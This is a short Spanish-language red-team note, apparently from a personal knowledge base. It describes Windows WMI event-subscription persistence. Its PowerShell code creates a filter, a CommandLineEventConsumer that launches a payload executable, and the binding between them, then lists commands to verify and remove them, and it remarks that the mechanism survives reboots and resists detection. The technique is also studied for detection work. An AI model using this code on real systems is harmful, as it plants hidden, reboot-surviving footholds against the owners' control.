---
title: WMI — Eventing (Persistencia)
tags: [wmi, persistence, cobalt-strike, commandlineeventconsumer]
---

# WMI Eventing — Persistencia

WMI Eventing permite ejecutar código cuando ocurren eventos del sistema. La persistencia consta de 3 componentes:

| Componente | Clase WMI | Función |
|------------|-----------|---------|
| Filter | `__EventFilter` | Condición que dispara el evento |
| Consumer | `CommandLineEventConsumer` | Acción a ejecutar |
| Binding | `__FilterToConsumerBinding` | Une Filter con Consumer |

## Implementación — root/subscription

```powershell
# 1. Crear el Filter (cada 60s si el proceso existe)
$filterArgs = @{
    Name        = "WindowsFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query       = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

# 2. Crear el Consumer (ejecutar payload)
$consumerArgs = @{
    Name            = "WindowsConsumer"
    CommandLineTemplate = "C:\Windows\System32\payload.exe"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# 3. Binding — enlazar filter y consumer
$bindingArgs = @{
    Filter   = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
```

## Verificar

```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

## Limpiar

```powershell
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
```

> [!important] La persistencia WMI sobrevive a reboots y es muy difícil de detectar sin herramientas especializadas (Autoruns, WMI Explorer).

> [!warning] Requiere privilegios de administrador. Los logs de WMI activity se guardan en `Microsoft-Windows-WMI-Activity/Operational`.
